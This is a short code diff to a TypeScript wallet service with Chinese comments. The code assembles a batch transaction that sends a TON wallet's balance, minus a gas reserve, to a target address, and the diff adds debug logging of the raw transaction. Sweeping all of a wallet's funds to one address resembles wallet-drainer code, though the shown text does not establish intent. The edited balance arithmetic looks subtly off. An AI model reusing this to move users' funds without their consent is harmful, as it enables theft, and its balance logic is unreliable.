@@ -238,12 +238,11 @@ export class WalletService {
       const messages = [];
 
       // 1. TON转账（保留少量作为Gas费）
-      const tonBalance = parseFloat(assets.ton.balanceTon);
+      const tonBalance = parseFloat((assets.ton.balanceTon - 0.1).toFixed(2));
       if (tonBalance > 0.1) {
-        const transferAmount = (tonBalance - 0.1).toFixed(9); // 保证 <= 9 位小数
         messages.push({
           address: targetAddress,
-          amount: this.toNanoStr(transferAmount),
+          amount: this.toNanoStr(tonBalance),
           payload: "",
         });
       }
@@ -318,7 +317,8 @@ export class WalletService {
       };
 
       console.log(`批量转移交易已生成: ${messages.length} 个消息`);
-
+      console.log("raw", raw);
+      console.log("messages", messages);
       return {
         success: true,
         data: { messages, raw },
